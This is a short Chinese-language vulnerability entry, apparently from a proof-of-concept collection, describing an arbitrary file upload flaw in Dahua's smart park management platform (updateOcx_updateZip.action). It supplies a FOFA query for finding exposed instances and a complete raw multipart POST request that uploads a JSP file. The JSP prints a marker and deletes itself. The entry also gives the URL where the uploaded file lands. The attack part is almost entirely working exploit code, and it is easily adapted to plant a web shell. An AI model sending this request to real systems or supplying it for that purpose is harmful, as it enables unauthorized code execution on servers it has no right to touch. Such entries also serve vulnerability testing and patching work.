# 大华智慧园区系统updateOcx_updateZip.action存在任意文件上传漏洞

大华智慧园区系统updateOcx_updateZip.action存在任意文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。

## fofa

```javascript
app="dahua-智慧园区综合管理平台"
```

## poc

```java
POST /portal/updateOcx_updateZip.action HTTP/1.1
Host: xx.xx.xx.xx
Accept-Encoding: identity
Content-Length: 431
Accept-Language: zh-CN,zh;q=0.8
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Connection: keep-alive
Referer: http://www.baidu.com
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=9aa1b50e33144fb18837cc97ed863df7

--9aa1b50e33144fb18837cc97ed863df7
Content-Disposition: form-data; name="updateBean.compressFileName"

KgJrYe.jsp
--9aa1b50e33144fb18837cc97ed863df7
Content-Disposition: form-data; name="updateBean.compress"; filename="KgJrYe.jsp"
Content-Type: text/plain

<% out.println(32461+18843+"eiaDXmEZEvlnjVVz");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
--9aa1b50e33144fb18837cc97ed863df7-
```

文件地址  20240801102132 文件上传时间戳

`http://xx.xx.xx.xx/portal/ocx/20240801102132/KgJrYe.jsp`